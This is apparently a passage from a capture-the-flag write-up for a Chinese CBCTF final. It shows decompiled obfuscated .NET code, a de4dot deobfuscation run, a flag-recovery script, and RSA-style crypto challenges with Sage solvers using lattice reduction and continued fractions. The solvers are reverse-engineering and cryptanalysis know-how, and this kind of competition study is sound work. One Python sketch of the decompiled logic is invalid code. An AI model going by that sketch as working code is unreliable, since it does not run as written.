 case 2:
 if (num3 > num2)
 {
 num4 = 3;
 continue;
 }
 A_0[num3 - 6] = Conversions.ToString(A_1[num3]);
 A_0[num3 - 6] = Conversions.ToString(Strings.Asc(A_0[num3 - 6]) ^ Strings.Asc(text[num]));
 num = (num + 1 ^ 5);
 num3++;
 num4 = 1;
 continue;
 case 3:
 result = false;
 num4 = 0;
 continue;
 case 4:
 goto IL_67;
 }
 break;
 IL_67:
 num4 = 2;
 }
 }
 return result;
 }
 }
 }
}
// ᜂ
// Token: 0x06000020 RID: 32 RVA: 0x00002748 File Offset: 0x00000948
private object ᜀ(ref string[] A_0)
{
 switch (0)
 {
 default:
 {
 object result;
 for (;;)
 {
 int num = checked(A_0.Length - 1);
 int num2 = 0;
 int num3 = 3;
 for (;;)
 {
 switch (num3)
 {
 case 0:
 goto IL_147;
 case 1:
 goto IL_5F;
 case 2:
 {
 bool flag;
 if (flag)
 {
 num3 = 10;
 continue;
 }
 double num4;
 num4 += 1.0;
 num3 = 6;
 continue;
 }
 case 3:
 goto IL_121;
 case 4:
 {
 double num4;
 double num5;
 if (num4 > num5)
 {
 num3 = 8;
 continue;
 }
 bool flag = checked(this.ᜀ((int)Math.Round(num4)) & this.ᜀ((int)Math.Round(unchecked(Conversions.ToDouble(A_0[num2]) - num4)))) != 0;
 num3 = 2;
 continue;
 }
 case 5:
 if (num2 > num)
 {
 num3 = 9;
 continue;
 }
 num3 = 12;
 continue;
 case 6:
 goto IL_5F;
 case 7:
 return result;
 case 8:
 goto IL_147;
 case 9:
 result = false;
 num3 = 7;
 continue;
 case 10:
 {
 if (true)
 {
 }
 double num4;
 A_0[num2] = Conversions.ToString(num4 * (Conversions.ToDouble(A_0[num2]) - num4));
 num3 = 0;
 continue;
 }
 case 11:
 goto IL_121;
 case 12:
 {
 try
 {
 A_0[num2] = Conversions.ToString((double)(Conversions.ToLong(A_0[num2]) ^ Conversions.ToLong(A_0[checked(num2 - 1)]) / (long)(num2 % 8)) + Conversions.ToDouble(A_0[checked(num2 - 1)]) % (double)(num2 % 8));
 goto IL_1D4;
 }
 catch (Exception ex)
 {
 A_0[num2] = Conversions.ToString((double)(Conversions.ToLong(A_0[num2]) ^ Conversions.ToLong(A_0[checked(num2 + 7)]) / 8L) + Conversions.ToDouble(A_0[checked(num2 + 7)]) % 8.0);
 goto IL_1D4;
 }
 goto IL_121;
 IL_1D4:
 A_0[num2] = Conversions.ToString(Conversions.ToDouble(A_0[num2]) - 2.0 - Conversions.ToDouble(A_0[num2]) % 2.0);
 double num5 = Conversions.ToDouble(A_0[num2]) - 2.0;
 double num4 = 2.0;
 num3 = 1;
 continue;
 }
 }
 break;
 IL_5F:
 num3 = 4;
 continue;
 IL_121:
 num3 = 5;
 continue;
 IL_147:
 checked
 {
 num2++;
 num3 = 11;
 }
 }
 }
 return result;
 }
 }
}
def isPrime(n):# 判断n是否为质数
   if n < 2:
       return 0
   for i in range(2, n - 1):
       if n % i == 0:
           return 0
   return 1
for num2 in range(len(input)):# input为第一个函数异或加密后的数组
   try:
           input(num2) = (input(num2) ^ (input(i - 1) // (num2 % 8))) + input(num2 - 1) % (num2 % 8)
   
except:
           input(num2) = (input(num2) ^ (input(i + 7) // 8)) + input(num2 + 7) % 8
            
            
   input(num2) = input(num2) - 2 - (input(num2) % 2)
   for j in range(2,input(num2) - 1):
           if isPrime(j) and isPrime(input(num2) - j):
               input(i) = j * (input(num2) - j)
PS D:
cbtest赛博杯final> D:
TOOLSnet混淆de4dot-masterde4dot-masterReleasenet45de4dot.exe D:
cbtest赛博杯finalcbNET-unpacked.exe

de4dot v3.1.41592.3405

Detected Dotfuscator 124576:1:1:4.9.6005.29054 (D:
cbtest赛博杯finalcbNET-unpacked.exe)
Cleaning D:
cbtest赛博杯finalcbNET-unpacked.exe
WARNING: File 'D:
cbtest赛博杯finalcbNET-unpacked.exe' contains XAML which isn't supported. Use --dont-rename.
Renaming all obfuscated symbols
Saving D:
cbtest赛博杯finalcbNET-unpacked-cleaned.exe
import hashlib

def isPrime(n):
   if n < 2:
       return 0
   for i in range(2, n - 1):
       if n % i == 0:
           return 0
   return 1

def xordecrypt(key):
   str = "0rays"
   circle = 0
   flag = ""
   for i in range(len(key)):
       flag = flag + chr(key[i] ^ ord(str[circle]))
       circle = (circle + 1) ^ 5
   flag = "CBCTF{" + flag + "}"
   t = hashlib.sha256()
   t.update(flag.encode())
   finalflag = t.hexdigest()
   if finalflag == "15c4ac7645546a1ef8141441b48e1824954fdbb159bf96400061b17db1af9edf":
       print(flag)
       exit(0)

def recursion(key2, i):
   key = key2.copy()
   if (i % 8) != 0:
       key[i] = (key[i] - key[i - 1] % (i % 8)) ^ (key[i - 1] // (i % 8))
   else:
       key[i] = (key[i] - key[i + 7] % 8) ^ (key[i + 7] // 8)
   if i != 0:
       decrypt(key, i - 1)
   else:
       xordecrypt(key)

def decrypt(key1, i):
   key = key1.copy()
   for j in range(2, key[i] - 2):
       if key[i] % j == 0 and isPrime(j) and isPrime(key[i] // j):
           key[i] = j + key[i] // j
           break
   key[i] = key[i] + 2
   recursion(key, i)
   key[i] = key[i] + 1
   recursion(key, i)

key = [309, 1981, 2823, 6979, 28339, 39487, 33035, 283711, 623, 4109, 23551, 54761, 67985, 231149, 499603, 1354567, 213,
       2651, 22559, 52549, 484663, 290793, 532213, 1746643]
decrypt(key, 23)
from Crypto.Util.number import *
import libnum
from random import randint
from secret import flag

p = getPrime(512)
d = getPrime(40)
m = libnum.s2n(flag)

a = randint(2,p)
b = randint(2,p)
c = randint(2,p)
g = d

for i in range(10):
    g = (c*d**2 + b*g + a)%p
    a = (a*b - c) % p
    b = (b*c - a) % p 
    c = (c*a - b) % p 

t = (m+d)**2 %p

print('p=',p)
print('a=',a)
print('b=',b)
print('c=',c)
print('g=',g)
print('t=',t)

'''
p= 7401065890119025282135237666865199348422934055235938750055484595354436662197240099942459295859988341711506222758512560253713779430837732509448750584143287
a= 5097231898212960128903074900985356055836951404060166089258364908769341550233458713815667681890859853754052526096733357598116801554550217975926267463812138
b= 6989276901421586140104653013021148101009186320041234303296655326755921455083826794462581309679969822114127882074306882159136892475173510202649622903142128
c= 4575573433881215441861821996374208582728569872429449710264906253767730954016883611590824227229273549790738144986204293298625807576019673353265052108819031
g= 4606139587619501210690571040197444906095169142901240337181570159608379282415730401796231483513399365820678663641796805405950996305199522144883918220978191
t= 5900014599731907456888112443089759499580759761986078581408643618098215500665266331415132596521096297891845966069328210113510021140407326977594544796697041
'''
    #sage
import libnum

p= 7401065890119025282135237666865199348422934055235938750055484595354436662197240099942459295859988341711506222758512560253713779430837732509448750584143287
a= 5097231898212960128903074900985356055836951404060166089258364908769341550233458713815667681890859853754052526096733357598116801554550217975926267463812138
b= 6989276901421586140104653013021148101009186320041234303296655326755921455083826794462581309679969822114127882074306882159136892475173510202649622903142128
c= 4575573433881215441861821996374208582728569872429449710264906253767730954016883611590824227229273549790738144986204293298625807576019673353265052108819031
g= 4606139587619501210690571040197444906095169142901240337181570159608379282415730401796231483513399365820678663641796805405950996305199522144883918220978191
t= 5900014599731907456888112443089759499580759761986078581408643618098215500665266331415132596521096297891845966069328210113510021140407326977594544796697041

a1 = [0 for i in range(10)]
b1 = [0 for i in range(10)]
c1 = [0 for i in range(10)]

for i in range(10):
    c = (b+c)*inverse_mod(a,p)
    b = (a+b)*inverse_mod(c,p)
    a = (c+a)*inverse_mod(b,p)
    c1[9-i] = c
    b1[9-i] = b
    a1[9-i] = a

R.<x> = PolynomialRing(GF(p))
y = x
for i in range(10):
    y = c1[i]*x^2 + b1[i]*y + a1[i]
y = y-g
ans = y.roots()
print(ans)
for i in ans:
    if i[0] < 2**40:
        d = i[0]

x1 = power_mod(t,(p+1)//4,p)
x2 = p-power_mod(t,(p+1)//4,p)

print(libnum.n2s(int(x1-d)))
print(libnum.n2s(int(x2-d)))
from Crypto.Util.number import *
import sympy
import random
from secret import flag

m = bytes_to_long(flag)
p = getPrime(512)
q = getPrime(512)
phi = (p-1)*(q-1)
e = 65537
n = p * q
c = pow(m, e, n)

s = getPrime(300)
N = getPrime(2048)
g = p * inverse(s,N)**2 % (N**2)
print(N)
print(g)
print(n)
print(c)

'''
1935130103580150811695555206331632746322792863831928408250407074523011979230
7421099534903837766317639913937954784857576991401214861067471772614753337821
8711081897803310810990418246692439280567651150687642467656809623486463839913
0382842612530384439426868219177523261128803920031659527905540882729625628914
3602827525373267536643865729646353071637054367702218515803980122435811129935
4504869501372798244914610413915722643717997972003318386905233491055899850327
3066831578731882924474331725779375314720987545812734087540036708186576228656
5978620979196410411241442894450955280237513249393612603560410291825805553536
595543937
1011720110790132739467118823404398231490558094490357447186598187961357141017
2164119011495413004147771446632149890321022069443535479574422584331444764562
3337668697058127975104586375292636080114347294697007231487782548846095107329
4454793673244246727760038997482343538578726275855953437364520881568850819077
5872708572331250648954936472164463625178035031241309813250605153131168563692
1117457469745637347738336829350634994271419554741425590636953154753970902976
9593083238386170910607548267274176888360265976148947453488080196541001966157
1973010990957889929924684891618203470525920690655276908703817928813908677271
9994577168184701096922291610523676039127012518100023765548552210944426749474
8883117510699361445833751940232278878487042675879152370574326096633281456081
9455073607425082241677944846708484212716555364951339760646405984736188064921
3934069715996589751778384513724306521043255299443480482640183740131563318058
4547119133975334369856181829236461924814861209420737193213722365390191079099
1059704713337170801775574449513411677199952195365459663222151926633937243945
2558083199640035069852530373510758859460350025736629801086757717838159774542
5067553356606077666779921056015186944051135523213421520418085861871818006798
45672788746273313
9010692891972727217347407061891195131321660659810849572438228436141537545449
0594410306345748069424740100772955015304592942129026096113424198209327375124
5766665774697611244707928428548849241994499969291346133826263943519885419803
8835815614333297953805846589017976033731578939891556064146565696879705075584
9799
5160924998284985610356444256693651570838081410699778339540066932461774895294
0831076546581735494963467680719842859574144530848473300102236821201997786375
9466014136604284614732040329850531282837518603150278432002142177154013917362
6281101696478358943974088499154305917566629872842856748104342249786283812790
3980
'''
    #sage
import gmpy2
import libnum

N = 19351301035801508116955552063316327463227928638319284082504070745230119792307421099534903837766317639913937954784857576991401214861067471772614753337821871108189780331081099041824669243928056765115068764246765680962348646383991303828426125303844394268682191775232611288039200316595279055408827296256289143602827525373267536643865729646353071637054367702218515803980122435811129935450486950137279824491461041391572264371799797200331838690523349105589985032730668315787318829244743317257793753147209875458127340875400367081865762286565978620979196410411241442894450955280237513249393612603560410291825805553536595543937
g = 101172011079013273946711882340439823149055809449035744718659818796135714101721641190114954130041477714466321498903210220694435354795744225843314447645623337668697058127975104586375292636080114347294697007231487782548846095107329445479367324424672776003899748234353857872627585595343736452088156885081907758727085723312506489549364721644636251780350312413098132506051531311685636921117457469745637347738336829350634994271419554741425590636953154753970902976959308323838617091060754826727417688836026597614894745348808019654100196615719730109909578899299246848916182034705259206906552769087038179288139086772719994577168184701096922291610523676039127012518100023765548552210944426749474888311751069936144583375194023227887848704267587915237057432609663328145608194550736074250822416779448467084842127165553649513397606464059847361880649213934069715996589751778384513724306521043255299443480482640183740131563318058454711913397533436985618182923646192481486120942073719321372236539019107909910597047133371708017755744495134116771999521953654596632221519266339372439452558083199640035069852530373510758859460350025736629801086757717838159774542506755335660607766677992105601518694405113552321342152041808586187181800679845672788746273313
n = 90106928919727272173474070618911951313216606598108495724382284361415375454490594410306345748069424740100772955015304592942129026096113424198209327375124576666577469761124470792842854884924199449996929134613382626394351988541980388358156143332979538058465890179760337315789398915560641465656968797050755849799
c = 51609249982849856103564442566936515708380814106997783395400669324617748952940831076546581735494963467680719842859574144530848473300102236821201997786375946601413660428461473204032985053128283751860315027843200214217715401391736262811016964783589439740884991543059175666298728428567481043422497862838127903980

m = matrix([[N,0],[g,1]])
a = m.LLL()
    #print(a)
p = abs(a[0][0])
assert n // p *p == n
q = n//p
phi = (p-1)*(q-1)
e = 65537
d = gmpy2.invert(e,phi)
m = pow(c,d,n)
print(libnum.n2s(int(m)))
    #sage
c = 262857004135341325365954795119195630698138090729973647118817900621693212191529885499646534515610526918027363734446577563494752228693708806585707918542489830672358210151020370518277425565514835701391091303404848540885538503732425887366285924392127448359616405690101810030200914619945580943356783421516140571033192987307744023953015589089516394737132984255621681367783910322351237287242642322145388520883300325056201966188529192590458358240120864932085960411656176
e = 543692319895782434793586873362429927694979810701836714789970907812484502410531778466160541800747280593649956771388714635910591027174563094783670038038010184716677689452322851994224499684261265932205144517234930255520680863639225944193081925826378155392210125821339725503707170148367775432197885080200905199759978521133059068268880934032358791127722994561887633750878103807550657534488433148655178897962564751738161286704558463757099712005140968975623690058829135
n = 836627566032090527121140632018409744681773229395209292887236112065366141357802504651617810307617423900626216577416313395633967979093729729146808472187283672097414226162248255028374822667730942095319401316780150886857701380015637144123656111055773881542557503200322153966380830297951374202391216434278247679934469711771381749572937777892991364186158273504206025260342916835148914378411684678800808038832601224951586507845486535271925600310647409016210737881912119

def plus(e, n):
    m = 2
    c = pow(m, e, n)
    q0 = 1

    list1 = continued_fraction(Integer(e)/Integer(n))
    conv = list1.convergents()
    for i in conv:
        k = i.numerator()
        #print(k)
        q1 = i.denominator()
        #print(q1)

        for r in range(20):
            for s in range(20):
                d = r*q1 + s*q0
                m1 = pow(c, d, n)
                if m1 == m:
                    print(r,s)
                    return d
     
        q0 = q1
d = plus(e, n)
print(d)
print(libnum.n2s(int(pow(c,d,n))))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/5-1663655380.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/8-1663655381.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663655382.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/3-1663655382.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/4-1663655382.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/7-1663655383.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/9-1663655384.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/7-1663655387.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/5-1663655388.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/09/6-1663655389.png)